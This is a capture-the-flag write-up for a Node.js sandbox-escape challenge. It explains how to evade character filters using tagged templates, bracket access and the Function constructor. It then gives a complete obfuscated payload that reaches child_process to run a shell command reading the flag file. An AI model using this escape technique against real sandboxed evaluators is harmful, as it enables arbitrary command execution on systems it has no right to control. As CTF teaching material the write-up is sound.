# Escape room 4

## Write-up

To bypass the restrictions you can:
 - Use two backticks instead of `()` to call functions
 - Use `something["some_name"]` instead of `something.some_name` to access properties
 - Use backticks instead of `"` or `'` to create strings
 - Create functions from strings by using the contructor's constructor which is the Function object
 - And we do not need numbers

```javascript
// Assign the splitted string "function Function() { [native code] }" to a variable 
//  - To access the Function method, we use the constructor.constructor method
//    since the constructor without parenthesis is considered a function and the constructor
//    of the function is the object "Function"
//  - To assign variables, we can instead merge object with the global context
Object[`assign`][`bind`]`${global}``${{chararray:``[`constructor`][`constructor`][`toString`]``[`split`]``}}`
// Shift 17 times the string to discard "function Function"
chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;
// Assign both "(" and ")" to variables
Object[`assign`][`bind`]`${global}``${{open_parenthesis:chararray[`shift`]``,close_parenthesis:chararray[`shift`]``}}`
// Create a function from a string that calls "process.mainModule.require("child_process").spawnSync("cat flag*",[],{shell:true}).stdout"
// Execute the function and join the buffer data with "," in between
// Print the value as a decimal array
console[`log`]`${``[`constructor`][`constructor`]`_${`return process[\`mainModule\`][\`require\`]${open_parenthesis}\`child_process\`${close_parenthesis}[\`spawnSync\`]${open_parenthesis}\`cat flag*\`,[],{shell:true}${close_parenthesis}[\`stdout\`]`}```[`join`]`,`}Decode the decimal array using cyberchef >>>`;
```

## Flag

`flag-108a55858ba2f0a498fb14666bab109f`
